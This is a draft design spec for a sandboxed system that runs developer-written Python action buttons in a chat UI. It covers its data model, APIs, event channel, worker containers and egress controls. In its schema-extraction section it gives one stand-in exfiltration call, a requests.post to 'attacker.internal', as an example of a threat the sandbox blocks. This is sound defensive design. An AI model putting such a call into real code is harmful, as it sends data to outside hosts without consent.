# ANILA Functions（v1）— Design Spec

**Date**: 2026-04-28
**Status**: Draft, awaiting user review
**Owner**: anila-ui + CSP backend
**Related**: OpenWebUI Functions（取設計靈感、不綁規格）

---

## 1. Problem & Scope

### 1.1 起源

內部某位 dev 之前在 OpenWebUI 寫過一個 Action Function（assistant 訊息底下的自訂 button，例：`填入文字助手 (TipTap 正確版)`），希望在 ANILA 也能做類似事情。經過 brainstorming 後確認真實需求是：

> 讓內部 developer 在 ANILA UI 上開發自己的「assistant 訊息底下的自訂 button」，
> 並把這個能力做得「盡量完整」：包含 inline Python editor、版本管理、admin 設定、
> 內部 marketplace、audit log、以及配套的安全治理。

### 1.2 In-scope（v1）

- **Action functions only** — assistant message-bound 自訂 button
- **Inline Python editor**（瀏覽器內、Monaco bundle、Python 語法高亮）
- **β 鬆相容 OpenWebUI**：`class Action` 結構保留，`__event_emitter__` 介面保留，但 body / metadata 用 ANILA 既有 schema
- **Append-only versioning**：每次 save 一筆新 row、UPDATE/DELETE 由 DB trigger 拒絕
- **Admin Valves**（per-Function 全域設定值；AES-256-GCM at rest）
- **Internal marketplace**：同 ANILA instance 內 dev 互相可見、可 fork
- **Live Test Console**：dev 在 UI 上直接跑、看 events stream
- **Audit log**：每次 Action 觸發保留 360 天（含完整 events_json，redact 後）
- **RBAC**：`developer` 寫；`developer`+`admin` 看 code；所有 role 看 metadata 並用 enabled function；`admin` 可 disable / 設 admin Valves
- **Worker 兩層隔離**：trusted **`anila-functions-worker-api`**（接 CSP）+ untrusted **`anila-functions-runner-exec`** / **`anila-functions-runner-extract`**（exec user code）；runner 加 **`cap_drop: ALL`**、**read-only rootfs + tmpfs `/tmp`**、**egress 預設 deny + outbound proxy allowlist**、**docker cgroup `mem_limit` + `pids_limit`**、30s timeout（runner-extract 3s）、non-root；container 在 `internal:true` networks 上、CSP 透過 control 層 talk to api 而非 runner
- **Event types**：`status`、**`host_command`（白名單動詞集；無 raw JS eval）**、`message`、`citation`、`error`（+ runtime sentinel `__done__`）
- **Worker schema extraction**：CSP 不 import / exec user code，valves & actions schema 解析委派 worker `/extract-meta` endpoint
- **/run 強制 ownership 檢查**：複用 CSP `conversation_service` gate（conversation/message access、message role=assistant、classified gate）
- **Abuse report**：user 可 `POST /api/functions/:slug/report` 回報、admin 收 audit_logs notification

### 1.3 Out of scope（v1，候補 v2）

- ❌ **Tools functions**（LLM 主動呼叫、function-calling 規格）
- ❌ **Filter functions**（inlet / stream / outlet hook）
- ❌ **UserValves**（per-user secret；v1 內網場景多數 Function 不需要、admin Valves 可解；v2 真有 per-user 第三方憑證需求才加）
- ❌ **UI version diff**（v1 留 raw 版本歷史，UI diff v2）
- ❌ **Per-agent / per-collection enable**（v1 全域 enabled/disabled）
- ❌ **`__event_call__`** / `__files__` / `__request__` reserved args
- ❌ **Runtime pip install**（worker image 預裝固定清單，內網部署不准動）
- ❌ **External marketplace** / 跨 instance import
- ❌ **Function 互呼**
- ❌ **Raw `execute` event（任意 JS eval）**：v1 由 `host_command` 白名單取代；如果 v2 開放 raw JS，必須加「per-user install + per-click confirm」護欄
- ❌ **Admin approval lifecycle（submitted/approved 狀態）**：避免 admin 巡邏負擔；改靠 code 可見度收緊 + 內部信任 + abuse report 治理

### 1.4 Non-goals

- 不打算複製 OpenWebUI 的全部 plugin 系統
- 不打算讓使用者上傳壓縮包匯入
- 不打算支援非 Python 的 Function 語言
- 不接受 runtime 可裝任意 Python 套件

---

## 2. Architecture（高階）

採用「Functions 元資料屬於 CSP，執行交給獨立 worker container」（brainstorming 階段方案 1）。

```
┌─────────────────────────────────────────────────────────────────┐
│                       anila-ui (browser)                         │
│  ┌───────────────────┐         ┌──────────────────────────────┐ │
│  │  /admin/functions │ ←edit→  │  ChatRuntime (existing)      │ │
│  │  Monaco editor    │         │  ┌────────────────────────┐  │ │
│  │  + Marketplace    │         │  │ MessageBubble          │  │ │
│  │  + Test console   │         │  │   ↳ toolbar:           │  │ │
│  │  + Versions       │         │  │     [📋][↻][👍][👎]    │  │ │
│  │  + Run audit      │         │  │     [✦Action1][⋯more]  │  │ │
│  └────────┬──────────┘         │  └────────────────────────┘  │ │
│           │                    └──────────────┬───────────────┘ │
└───────────┼───────────────────────────────────┼─────────────────┘
            │ /api/functions/* (JWT cookie)     │ /api/functions/:id/run (SSE)
            ▼                                   ▼
┌─────────────────────────────────────────────────────────────────┐
│                            CSP                                    │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  /api/functions     CRUD + version + marketplace + audit  │   │
│  │  /api/functions/:slug/run  → 把 code+context 丟給 worker  │   │
│  │                            ← 透過 SSE 把 events 中繼回 UI │   │
│  │                            ← redact secret pattern        │   │
│  └──────────┬─────────────────────────────────────┬──────────┘   │
│  ┌──────────┴────────────┐                        │              │
│  │  PostgreSQL           │                        │              │
│  │  action_functions     │                        │              │
│  │  action_function_     │                        │              │
│  │    versions (append)  │                        │              │
│  │  action_function_     │                        │              │
│  │    valves (encrypted) │                        │              │
│  │  action_function_     │                        │              │
│  │    runs               │                        │              │
│  └───────────────────────┘                        │              │
└──────────────────────────────────────────────────┼──────────────┘
                                                    │ HTTP (intranet)
                                                    │ X-Functions-Secret
                                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│  anila-functions-worker-api (NEW, trusted gate)                  │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  POST /exec, /extract-meta — CSP-facing                  │   │
│  │  → forward to runner via control-net                     │   │
│  │  → SSE relay; verifies X-Functions-Secret                │   │
│  │  Does NOT exec user code itself                          │   │
│  └────────────────────┬──────────────────────┬──────────────┘   │
│                        │ control-net          │                  │
│                        ▼                      ▼                  │
│  ┌─ runner-exec (NEW, untrusted) ─┐ ┌─ runner-extract (NEW) ─┐  │
│  │  POST /exec → spawn subprocess │ │  POST /extract-meta    │  │
│  │  cap_drop:ALL, seccomp, RO     │ │  比 exec 更嚴 profile  │  │
│  │  mem_limit:256m, pids_limit:32 │ │  mem_limit:64m, 3s     │  │
│  │  egress: only via egress-proxy │ │  egress: NONE          │  │
│  │  Concurrency: pool of 8        │ │  (extract-net 完全隔離) │  │
│  └────────────────────────────────┘ └──────────────────────────┘ │
│             │                                                    │
│             ▼ (functions-net, internal:true)                     │
│  ┌─ anila-functions-egress (NEW squid sidecar) ───────────────┐  │
│  │  Bridge to anila-internal; allowlist-only forwarding       │  │
│  └─────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

**Component summary**：

| Component | New / Existing | Networks | Trusted? | Role |
|---|---|---|---|---|
| `anila-ui` (`ANILA_UI/anila-ui`) | Existing, extended | anila-internal | ✅ | 加 `/admin/functions/*` 路由與 ChatRuntime button render |
| CSP (`myCSPPlatform`) | Existing, extended | anila-internal | ✅ | 加表 / endpoint / SSE relay logic |
| `anila-functions-worker-api` | **NEW** | anila-internal + control-net | ✅ trusted | 接 CSP；轉發到 runner；不 exec user code |
| `anila-functions-runner-exec` | **NEW** | control-net + functions-net (`internal:true`) | ❌ untrusted | exec user code；連得到 egress-proxy only |
| `anila-functions-runner-extract` | **NEW** | control-net + extract-net (`internal:true`, 無 proxy) | ❌ untrusted | exec user code；無任何 egress |
| `anila-functions-egress` | **NEW** | anila-internal + functions-net | ✅ trusted | squid，allowlist 內 host 才轉 |
| PostgreSQL | Existing | anila-internal | ✅ | 多 5 張表（含 reports） |

---

## 3. Data Model

### 3.1 `action_functions`

| 欄位 | 型別 | 說明 |
|---|---|---|
| `id` | `bigserial PK` | |
| `slug` | `varchar(64) unique` | URL / API 用，dev 自訂；regex `^[a-z0-9][a-z0-9-]{0,63}$` |
| `title` | `text` | 從 metadata header 抽出，denormalized for fast list |
| `description` | `text` | 同上 |
| `icon_data_url` | `text` nullable | base64 inline icon |
| `author_user_id` | `bigint FK users` | 寫這個 Function 的 dev |
| `status` | `enum('draft','enabled','disabled','quarantined')` | dev=draft → self-publish enabled；author 可自行 disable（暫停）；admin 可 disable（同 author 暫停）或 **quarantine**（疑似濫用、code 鎖到 author+admin） |
| `disabled_reason` | `text` nullable | admin 在 disable / quarantine 時填入；audit 可查 |
| `latest_version_id` | `bigint` (no FK; denormalized cache) | 跟 `versions` 沒 FK 關係，避免 circular FK；read 時 LEFT JOIN，找不到視為無版本 |
| `forked_from_id` | `bigint FK self`, nullable | marketplace fork 來源 |
| `tags` | `text[]` | marketplace 搜尋；空陣列允許 |
| `created_at`, `updated_at` | `timestamptz` | |

唯一鍵：`slug` 全域唯一。

### 3.2 `action_function_versions`

| 欄位 | 型別 | 說明 |
|---|---|---|
| `id` | `bigserial PK` | |
| `function_id` | `FK functions` | |
| `version_no` | `int` | 每個 function 各自從 1 累加 |
| `code` | `text` | 完整 Python 原始碼 |
| `metadata_json` | `jsonb` | parse docstring frontmatter |
| `actions_meta_json` | `jsonb` | `[{id, name, icon_url}, ...]`，dev 在 `class Action.actions` 宣告 |
| `valves_schema_json` | `jsonb` | 從 `class Valves(BaseModel)` 抽 JSON Schema |
| `editor_user_id` | `FK users` | 誰按了存檔 |
| `commit_message` | `text`, nullable | optional |
| `created_at` | `timestamptz` | |

唯一鍵：`(function_id, version_no)`。
Append-only 強制：Postgres trigger 攔截 UPDATE/DELETE。

**並發控制**：save 新版本時 wrap 在 transaction：
1. `pg_advisory_xact_lock(:NS, :function_id)` — namespaced 2-int advisory key；`NS` 是常數（v1 用 `42` 保留給 action_function 表族）；不依賴 hashtext 避免碰撞
2. `version_no = (SELECT COALESCE(MAX(version_no),0) + 1 FROM action_function_versions WHERE function_id = :fid)`
3. INSERT versions row → 取回 `id`
4. UPDATE `action_functions.latest_version_id = :id`
5. COMMIT（advisory lock 自動釋放）

避免 concurrent save 同一 function 撞 unique key；不同 function 並行不互相阻擋。

**Schema 抽取（valves_schema_json / actions_meta_json / metadata_json）**：CSP **不**自己 exec user code；改 POST 到 worker `/extract-meta`（同 sandbox 內 introspect）取回 JSON 後再 INSERT。詳見 §5.3。

### 3.3 `action_function_valves`（加密）

| 欄位 | 型別 | 說明 |
|---|---|---|
| `function_id` | `FK functions PK` | |
| `values_encrypted` | `bytea` | AES-256-GCM ciphertext of values_json |
| `nonce` | `bytea` | GCM nonce（每次 encrypt 重新產生） |
| `key_version` | `int` | 配合手動 key rotation |
| `updated_by` | `FK users` | |
| `updated_at` | `timestamptz` | |

加密 key 從 ENV `ANILA_FUNCTIONS_VALVES_KEY` 載入（256-bit base64）。

### 3.4 `action_function_runs`

| 欄位 | 型別 | 說明 |
|---|---|---|
| `id` | `bigserial PK` | |
| `function_id` | `FK functions` | |
| `version_no` | `int` | 跑的是哪個 version |
| `action_id` | `text` | function 內的 button id |
| `triggered_by_user_id` | `FK users` | |
| `context_type` | `enum('chat_message','test_console')` | |
| `conversation_id` | `FK conversations` nullable | |
| `message_id` | `FK messages` nullable | |
| `request_payload_json` | `jsonb` | redacted before commit |
| `status` | `enum('queued','running','success','error','timeout')` | |
| `error_message` | `text` nullable | |
| `duration_ms` | `int` | |
| `events_json` | `jsonb` | redacted before commit |
| `started_at`, `ended_at` | `timestamptz` | |

Index：`(function_id, started_at DESC)`、`(triggered_by_user_id, started_at DESC)`、`(conversation_id)`。

Retention：`started_at < now() - interval '360 days'` 由日批 cron job purge。

### 3.5 `action_function_reports`（abuse 回報）

| 欄位 | 型別 | 說明 |
|---|---|---|
| `id` | `bigserial PK` | |
| `function_id` | `FK functions` | |
| `reporter_user_id` | `FK users` | 誰回報 |
| `reason` | `text` | 自由文字、限 1000 字 |
| `status` | `enum('open','acknowledged','dismissed','actioned')` | admin 處理用 |
| `acknowledged_by` | `FK users` nullable | |
| `created_at`, `updated_at` | `timestamptz` | |

Index：`(function_id, status)`、`(status, created_at DESC)` 給 admin 看 open queue。

回報時同步 INSERT 一筆 `audit_logs` 高階紀錄，admin 既有 audit dashboard 自動會看到。

### 3.6 Marketplace / 可見度

不另起 marketplace 表。每筆 `action_functions` 的可見度按欄位拆：

| 欄位 | `user` | `developer` | `admin` |
|---|---|---|---|
| metadata（title / description / icon / author / tags / status / disabled_reason） | ✅ | ✅ | ✅ |
| **code**（含 versions table 的 `code` 欄位） | ❌ | enabled/disabled ✅；draft 僅 author；**quarantined 僅 author+admin** | ✅ |
| valves schema | ✅ | ✅ | ✅ |
| valves values（解密後） | ❌ | ❌ | ✅ |
| audit runs | 自己跑的 ✅ | 自己 + own function 的 ✅ | ✅ |

**`quarantined` 狀態語意**：admin 認定 function 有疑慮（abuse report 屬實 / classified leak / 釣魚 etc.）時切過去，效果：
- 不出現在 `enabled-actions`（chat toolbar 看不到）
- code 對其他 developer 隱藏（防止複製手法）
- author 仍可看自己的 code（修正用）
- 一旦切到 quarantined、不再能 self-publish 回 enabled（必須 admin 解除）

「fork」=「INSERT 新 row + `forked_from_id`」+「duplicate code 為新 fork 的 v1」；只能 fork **enabled** 的 function。fork 出來的副本回到 `draft`、author 是 forker。

---

## 4. API（CSP `/api/functions/*`）

所有 endpoint 走 CSP 既有 JWT cookie + role middleware。

### 4.1 Function CRUD

| Method | Path | Role | 說明 |
|---|---|---|---|
| `GET` | `/api/functions?author=me&status=enabled&tag=lint&q=...` | any | 列表 |
| `POST` | `/api/functions` | `developer`+ | 建新 |
| `GET` | `/api/functions/:slug` | any | Function metadata；**code 欄位僅 developer+/admin 看得到**（user role 拿到的 response 不含 `code`/`versions[].code`） |
| `PATCH` | `/api/functions/:slug` | author or `admin` | 改 metadata（不改 code） |
| `DELETE` | `/api/functions/:slug` | author or `admin` | v1 設 `status='disabled'` |

### 4.2 Versions

| Method | Path | Role | 說明 |
|---|---|---|---|
| `POST` | `/api/functions/:slug/versions` | author or `admin` | 存新版本 |
| `GET` | `/api/functions/:slug/versions` | developer+ for enabled/disabled；author/admin for draft | 版本列表 |
| `GET` | `/api/functions/:slug/versions/:version_no` | 同上 | 拿特定版本 code |

### 4.3 Valves（加密）

| Method | Path | Role | 說明 |
|---|---|---|---|
| `GET` | `/api/functions/:slug/valves` | author or `admin` | secret 欄位回 `{has_value: true}` 不回明文 |
| `PUT` | `/api/functions/:slug/valves` | `admin` | upsert |

### 4.4 Marketplace / Abuse report

| Method | Path | Role | 說明 |
|---|---|---|---|
| `POST` | `/api/functions/:slug/fork` | `developer`+ | 複製成自己的；source 必須 `status=enabled` |
| `POST` | `/api/functions/:slug/report` | any logged-in | body: `{reason}`；插入 reports 表 + audit_logs 高階紀錄 |
| `POST` | `/api/functions/:slug/quarantine` | `admin` | body: `{reason}`；status → `quarantined`；code 自動鎖到 author+admin |
| `POST` | `/api/functions/:slug/unquarantine` | `admin` | status → `disabled`（不直接回 enabled，author 自己決定要不要 re-publish） |
| `GET` | `/api/functions/reports?status=open` | `admin` | admin 處理 queue |
| `PATCH` | `/api/functions/reports/:id` | `admin` | 改 status / acknowledge |

### 4.5 Run（SSE）

| Method | Path | Role | 說明 |
|---|---|---|---|
| `POST` | `/api/functions/:slug/run` | any（enabled）；author 可 `test_mode=true` 跑 disabled | response: `text/event-stream` |

Request body：
```
{
  "action_id": "my-btn",
  "context": {
    "conversation_id": 123,
    "message_id": 456,
    "selected_text": "..."
  },
  "test_mode": false
}
```

**前置授權檢查 — 兩條路徑（chat_message vs test_console），任一失敗 → 403 / 404、不漏訊息以免 enumeration**：

```
共用前置：
  1. resolve_caller(JWT) → caller
  2. lookup_function(slug) → function（404 if not found）

if test_mode=true:                           if test_mode=false (chat_message):
  3a. caller 必須是 function.author          3b. function.status == 'enabled'
      OR admin（否則 403）                       （否則 403）
  4a. function.status 可以是                 4b. conversation_service.get_conversation
      draft/enabled/disabled                     (caller, body.context.conversation_id)
      （含 quarantined → 仍 author/admin         → 走既有 _check_access()
        可看自己的）                              owner/admin only（v1）
  5a. body.context 視為 synthetic：           5b. message belongs_to_conversation
      conversation_id / message_id 可空         (message_id, conversation_id)
      audit 紀錄 context_type=test_console     5c. message.role == 'assistant'
                                              5d. classified gate（v1：沿用既有
                                                  conversation_service 行為，目前
                                                  只有 owner/admin；clearance
                                                  / share / handoff 是 future work）
```

**v1 owner/admin gate 說明**（Codex round-2 M4）：
- 目前 `myCSPPlatform/backend/app/services/conversation_service.py:38, 357` 的 `_check_access()` 只有 `owner | admin`，沒有 share / handoff / clearance gate
- v1 spec 明列「complies with whatever conversation_service.get_conversation() enforces today」，未來 conversation_service 加 share / handoff / clearance gate 時、Functions 自動跟著（沒有獨立 reimplement）
- 不要造輪子：classified clearance 在 conversation_service 層級實作；Functions 依賴上游
- v2 follow-up：等 share / handoff conversation_service 改寫完，順手把 Functions E2E 測試擴充

**測試對應**：
- chat_message + caller is owner ✅
- chat_message + caller is non-owner non-admin → 403
- chat_message + message.role='user' → 403
- chat_message + message 不在 conversation → 403
- test_console + caller is author ✅（function 可 draft/disabled/quarantined）
- test_console + caller is not author and not admin → 403
- test_console + body.context.conversation_id 空 → 不報錯（synthetic）

通過後才進 worker 派送與 SSE relay。

SSE 回傳：
```
event: function_event
data: {"type":"status","description":"開始執行","done":false}

event: function_event
data: {"type":"host_command","verb":"composer.set_text","args":{"text":"..."}}

event: function_event
data: {"type":"message","content":"..."}

event: function_event
data: {"type":"citation","payload":{...}}

event: function_event
data: {"type":"error","message":"..."}

event: function_done
data: {"run_id":789,"duration_ms":234,"status":"success"}
```

### 4.6 Run audit

| Method | Path | Role | 說明 |
|---|---|---|---|
| `GET` | `/api/functions/:slug/runs?limit=50` | author or `admin` | audit 列表 |
| `GET` | `/api/functions/runs/:run_id` | author / admin / `triggered_by` self | 完整 events_json |

### 4.7 ChatRuntime button render

| Method | Path | Role | 說明 |
|---|---|---|---|
| `GET` | `/api/functions/enabled-actions` | any | 攤平 enabled actions |

```
{
  "actions": [
    {
      "function_slug": "fill-text-helper",
      "action_id": "my-btn",
      "name": "自定義圖示",
      "icon_data_url": "data:image/png;base64,...",
      "function_version": 3
    }
  ]
}
```

---

## 5. Event Channel（執行流）

### 5.1 時序

CSP 透過 `anila-internal` call **worker-api**（trusted gate），api 透過 `anila-functions-control-net` call runner（untrusted、會 spawn subprocess 跑 user code）。

```
Browser   CSP /run         worker-api          runner-exec        subprocess
  │  POST  │                  │                    │                   │
  ├───────▶│                  │                    │                   │
  │        │ RBAC + ownership │                    │                   │
  │        │ DB lookup        │                    │                   │
  │        │ INSERT runs(run.)│                    │                   │
  │        │ POST /exec +     │                    │                   │
  │        │  X-Functions-Sec │                    │                   │
  │        ├─(anila-internal)▶│                    │                   │
  │        │                  │ verify secret      │                   │
  │        │                  │ POST /exec to      │                   │
  │        │                  │  runner-exec       │                   │
  │        │                  ├─(control-net)─────▶│                   │
  │        │                  │                    │ spawn subprocess  │
  │        │                  │                    ├──────────────────▶│
  │SSE     │SSE (redact)      │SSE relay           │SSE (per-line)     │ stdout
  │◀───────┤◀─────────────────┤◀───────────────────┤◀──────────────────┤
  │  ...   │  ...             │  ...               │  ...              │ ...
  │        │                  │                    │ data="__done__"   │
  │        │                  │                    │◀──────────────────┤
  │        │                  │ relay __done__     │                   │
  │        │ redact + UPDATE  │                    │                   │
  │        │  runs(success)   │                    │                   │
  │event=  │                  │                    │                   │
  │function│                  │                    │                   │
  │_done   │                  │                    │                   │
  │◀───────┤                  │                    │                   │
```

`/extract-meta` 走同樣的拓樸但 runner 是 `runner-extract`（連 extract-net、無 egress）。

### 5.2 Worker handlers（要點）

**`anila-functions-worker-api` `/exec` handler（trusted gate）**：
- 接收 ExecRequest（驗 `X-Functions-Secret`）
- 純 forward 到 runner-exec（control-net 上的 internal hostname）；自身不 import / exec user code
- 把 runner 回的 SSE stream 轉送回 CSP（順便兜底 timeout / connection error）

**`anila-functions-worker-api` `/extract-meta` handler**：
- 同上但 forward 到 runner-extract

**`anila-functions-runner-exec` `/exec` handler（untrusted runner）**：
- 接收 ExecRequest（驗 `X-Functions-Secret`，跟 api 共用）
- spawn `python -u runtime.py`，stdin pipe 餵 JSON request
- preexec_fn 補強 rlimits（cpu 30s、nproc 32）；**memory 由 docker `mem_limit:256m` cgroup 控制（不靠 RLIMIT_RSS — Linux 上不可靠）**
- StreamingResponse async 把 stdout 每行轉成 SSE `data:` line
- 結束 wait 2s 後強制 wait

**`anila-functions-runner-extract` `/extract-meta` handler**：同上但設定不同（3s timeout、64MB cgroup mem、不傳 valves/user/metadata）

### 5.3 Worker `/extract-meta` endpoint（schema 抽取，**比 /exec 更嚴**）

**為何不在 CSP 做**：CSP 端 `import` 或 `compile + exec` user code 就是把 save path 變成 RCE（Codex round-1 #6）。

**為何 /extract-meta 必須比 /exec 更嚴**：save path 觸發頻率高（每次 dev 按存檔）、不該成為定期 trigger top-level code 對 allowlisted host 做 side effect 的入口（Codex round-2 H2）。

**Strategy — 兩階段**：

**Stage 1 — Static AST parse（優先）**：
- 用 `ast.parse` + walker 讀以下內容（**不 exec**）：
  - 模組 docstring → `metadata_json`（title / version / description / author）
  - `class Action` 的 `actions = [{...}]` literal list → `actions_meta_json`（list 必須是 ast.Constant / ast.Dict literal，否則放棄、進 stage 2）
  - `class Valves(BaseModel)` 的欄位宣告（type annotation + Field(default=...) literal）→ 直接組 JSON Schema
- 大部分 Function 都能停在 stage 1（你同事的 `填入文字助手` 範例就是純 literal、不需 exec）

**Stage 2 — Restricted sandbox exec（fallback）**：
- 觸發條件：stage 1 偵測到 dynamic 結構（Valves 用 `Annotated[X, Field(...)]` 含複雜 default、actions list 是 comprehension 等）
- Profile（**比正式 run 嚴格**）：
  - **Egress 完全 deny**：runner-extract 連到 `anila-functions-extract-net`（`internal: true`、**無** egress proxy）；連 allowlisted host 都連不到
  - **Timeout 3s**（vs run 的 30s）
  - **Memory：docker `mem_limit:64m`**（cgroup-enforced；vs run 的 256m）；不靠 RLIMIT_RSS
  - **`pids_limit:16`**（fork bomb 擋）
  - **不傳 valves / `__user__` / `__metadata__`**（runtime.py 進 extract mode 時這些都不注入）
  - **Stdout / stderr cap 16KB**（多砍掉、防止 fork bomb 把 log 灌爆）
  - **不執行 `Action.action()`**：runtime.py extract mode 只 `exec` 模組頂層、`Action.actions` 讀屬性、`Valves` 呼叫 `.model_json_schema()`，**不**呼叫 instance.action()
- 即使 user code 在 module top-level 跑了 side effect（如 `requests.post('https://attacker.internal')`），也因為 extract-meta-net 沒任何出口而失敗

**Flow**：
```
CSP receives POST /api/functions/:slug/versions {code}
  ↓ slug regex / RBAC / size 限制 (e.g. <128KB)
CSP POST worker /extract-meta {code}
  ↓
worker stage 1: ast static parse
   - 成功 → return JSON
   - 偵測 dynamic feature → stage 2
worker stage 2: spawn subprocess in extract-mode
   - extract network (internal: true, no egress)
   - 3s timeout, mem_limit:64m (cgroup), pids_limit:16, no valves/user/metadata
   - exec module top-level
   - read Action.actions (attribute), Valves.model_json_schema() (method call)
   - 不 instantiate / 不 call action()
  return JSON: {actions_meta_json, valves_schema_json, metadata_json, errors[]}
  ↓
CSP 收到 JSON → INSERT versions row（plain string + JSON，**不 exec**）
```

**Network 隔離（v1 採用兩個 runner container，不用 netns 切換）**：

`anila-functions-runner-exec` 連 `anila-functions-net`（有 egress proxy）；`anila-functions-runner-extract` 連 `anila-functions-extract-net`（**無** egress proxy、`internal:true` 完全沒出口）。worker-api 透過 control-net 路由 `/exec` 到 runner-exec、`/extract-meta` 到 runner-extract。

⚠️ **不**使用 `unshare(CLONE_NEWNET)` / `os.unshare` 切 netns 的方案：seccomp 明確 block `unshare` syscall（§5.7），這條路是死的；同時若允許 unshare、user code 也可能濫用、跟 sandbox 哲學矛盾。兩個 runner container 在 ops 上多 1 個 service 但邊界乾淨、跟 seccomp 政策一致。

**Worker `/extract-meta` request**：`{code: string}` + `X-Functions-Secret` header
**Response**：
```json
{
  "actions_meta_json": [{"id": "my-btn", "name": "...", "icon_url": "..."}],
  "valves_schema_json": {"$schema": "...", "type": "object", "properties": {...}},
  "metadata_json": {"title": "...", "description": "...", "version": "1.0"},
  "extract_strategy": "ast" | "sandbox",
  "errors": []
}
```

如果 `errors` 非空（語法錯、缺 `class Action`、`Valves` 不是 BaseModel、stage 2 timeout 等），CSP 端 reject save 並回 4xx 給前端、不 INSERT version。

### 5.4 `runtime.py`（worker image 內建 wrapper）

Pseudocode：

```
async def main():
    req = json.loads(sys.stdin.readline())
    user_ns = {"__name__": "__user_function__"}
    compile_and_run(req["code"], user_ns)

    async def event_emitter(event):
        sys.stdout.write(json.dumps(event) + "\n")
        sys.stdout.flush()

    action_cls = user_ns.get("Action")
    if action_cls is None:
        await event_emitter({"type": "error", "message": "missing Action class"})
        return

    instance = action_cls()
    if hasattr(instance, "Valves"):
        instance.valves = instance.Valves(**req.get("valves", {}))

    try:
        result = await instance.action(
            body=req["body"],
            __event_emitter__=event_emitter,
            __user__=req.get("user"),
            __metadata__=req.get("metadata"),
        )
        await event_emitter({"type": "__done__", "result": result})
    except Exception as e:
        await event_emitter({"type": "error", "message": f"{type(e).__name__}: {e}"})
        await event_emitter({"type": "__done__", "result": None})

asyncio.run(main())
```

### 5.5 Reserved args

| 參數 | 形狀 | 來源 |
|---|---|---|
| `body` | `{action_id, conversation_id, message_id, message_content, selected_text}` | request |
| `__event_emitter__` | `async (event: dict) -> None` | runtime |
| `__user__` | `{id, username, email, role}` | CSP JWT 解出 |
| `__metadata__` | `{conversation_id, message_id, model_name, agent_name, started_at}` | CSP DB lookup |

### 5.6 SSE event types（瀏覽器端 dispatch）

| `data.type` | 瀏覽器行為 | 安全 |
|---|---|---|
| `status` | transient toast：`{description, done}` | 純文字 |
| **`host_command`** | 白名單 verb dispatch（**無 raw JS eval**） | server + client 雙重驗 verb 在白名單；args schema 驗證 |
| `message` | conversation 插入 system 訊息（render 走既有 markdown sanitize） | DOMPurify |
| `citation` | push CitationsDrawer state | 走既有 trust pipeline |
| `error` | 紅 toast、不中斷 | 純文字 |
| `__done__` | runtime sentinel；不送 browser，CSP 收到才 emit `function_done` | — |

**`host_command` 白名單動詞集**（v1）：

| Verb | Args Schema | 行為 | User activation |
|---|---|---|---|
| `composer.set_text` | `{text: string}` | 取代 chat input 全文 | 不需要 |
| `composer.insert_text` | `{text: string, at?: 'cursor' \| 'end'}` (default: `cursor`) | 在 cursor / end 插入 | 不需要 |
| **`clipboard.copy`** | `{text: string, preview?: string}` | **顯示 toast**「Click to copy: <preview>」**user 點 toast 才複製**（user activation 要求）；preview 沒給就用 text 前 40 字元 | **需要**（fallback UX 內建） |
| `citation.open` | `{citation: Citation}`（既有 Citation type） | push CitationsDrawer state | 不需要 |
| `chat.show_modal` | `{title: string, content_md: string}` | 顯示 markdown modal（content 走 DOMPurify） | 不需要 |
| **`link.open`** | `{url: string, label?: string}` | URL 先驗 allowlist regex；通過 → **顯示 toast**「Open <label or url>」**user 點 toast 才開新分頁**（避開 popup blocker） | **需要**（fallback UX 內建） |

`★ Browser user-activation 處理`（Codex round-2 L7）：
- `clipboard.copy` 跟 `link.open` 在 modern browser 都需要 transient user activation；async SSE dispatch 觸發時，原本 click handler 已 return、activation lost
- v1 設計：這兩個 verb 都不嘗試「直接執行」，而是 **render 一個 click-to-confirm UI element**（toast / inline button），把 user activation 從「原本的 click」延遲到「user 點這個 toast」
- 文字 / URL 來自 server-emitted args，仍由 dev 控制；user 看得到要 copy / open 什麼才點
- 額外好處：對 user 也是 anti-phishing 護欄（看清楚要 copy 什麼 / 開哪個 URL 才確認）
- 失敗 UX：如果 toast 5 秒沒被點 → 自動消失、emit 一筆 audit metric `function_host_command_unconfirmed_total{verb}`，不視為錯誤（user 可能就是不想做）

**前後端兩層驗證**：
- CSP 端：read SSE chunk 後 → 驗 `data.type=='host_command'` 時 `verb` 在白名單、args 滿足對應 schema、URL/text 字串合理（長度 / 字元集）→ 通過才轉發
- 前端 dispatch：再驗一次（避免有人繞 CSP 直接 SSE 注入）；不在白名單一律拋 error toast 並寫 console warn

**Test Console 行為**：v1 不再有「Run anyway」概念，因為 `host_command` 沒有 RCE 風險；正常 dispatch 即可。

### 5.7 Resource limits / sandbox（**rlimit 不是完整 sandbox**）

`preexec_fn + rlimit` 只是「**避免無辜 dev 寫錯 code 把 worker 拖垮**」，**不**是抵抗 active attacker 的 sandbox。真正的 sandbox 是 container hardening + outbound proxy。設計上必須預設「任何 untrusted code 都會嘗試 exfiltration」、用 prevent 不用 detect。

| 限制 | 值 | 觸發 |
|---|---|---|
| Wall clock | 30s | SIGKILL → SSE error + function_done(timeout) |
| **Memory** | **runner-exec: docker `mem_limit:256m`（cgroup-enforced，hard limit）；runner-extract: `mem_limit:64m`** | container OOM kill → subprocess SIGKILL → SSE `error: out_of_memory` |
| **PIDs** | runner-exec `pids_limit:32`；runner-extract `pids_limit:16` | fork bomb cgroup 級別擋下 |
| ~~RSS rlimit~~ | ~~256/64 MB~~ | **Linux `RLIMIT_RSS` 多數 kernel 不 enforce、不可靠**；保留 cpu/nproc 的 setrlimit 為輔，記憶體靠 cgroup |
| CPU | 30s ulimit | 同 wall clock |
| **Network egress** | **預設 deny；出網經 outbound proxy + allowlist** | proxy 拒絕 → user code 收連線失敗（具體錯誤可能是 connection refused / timeout / no route，視 docker 版本與目標 IP 而定；測試應驗「不能連通」、不綁特定錯誤字串） |
| Filesystem | 容器內 `tmpfs:/tmp:size=64m,mode=1777`（per-run subdir）；rootfs `read_only:true` | — |
| Subprocess UID | 非 root（`nobody`） | docker isolation |
| **Linux capabilities** | **`cap_drop: [ALL]`** | 容器啟動就丟掉 |
| **Seccomp** | 自訂 profile（block: `ptrace`, `mount`, `unshare`, `kernel_module`, `bpf`, `clone3`）；以 docker default 為基礎收緊 | syscall 不允 → SIGSYS |
| **AppArmor / SELinux**（哪個 host 有就用） | confine profile，禁止 `mount`, `ptrace`, capability raise | — |
| `--security-opt=no-new-privileges` | enabled | 阻止 setuid escalation |
